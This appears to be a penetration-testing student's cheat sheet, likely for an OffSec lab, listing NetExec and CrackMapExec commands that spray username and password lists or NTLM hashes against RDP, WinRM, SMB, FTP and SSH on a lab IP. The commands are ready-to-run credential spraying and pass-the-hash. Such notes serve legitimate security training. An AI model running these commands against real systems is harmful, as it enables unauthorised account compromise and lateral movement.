# Can work with hashes using (-H)

RDP
```bash
nxc rdp 192.168.100.200 -u usernames -p passwords --continue-on-success
```

WinRM
```bash
nxc winrm 192.168.100.200 -u usernames -p passwords --continue-on-success
```

SMB
```bash
nxc smb 192.168.100.200 -u usernames -p passwords --continue-on-success
```

FTP
```bash
nxc ftp 192.168.100.200 -u usernames -p passwords --continue-on-success
```

SSH
```bash
nxc ssh 192.168.100.200 -u usernames -p passwords --continue-on-success
```
> Breaks for ssh, use crackmapexec

Other options include `-d` to specify domain eg. (corp.com, lab.offsec)
Can also use a list of IP addresses instead of specifying one. Similarly, can also indicate single username/password instead of providing a list all the time

# If nxc breaks (again)

Password
```bash
crackmapexec smb 192.168.100.200 -u usernames -p passwords --continue-on-success
```

Hashes
```bash
crackmapexec smb 192.168.100.200 -u usernames -H hashes --continue-on-success
```

just use crackmapexec
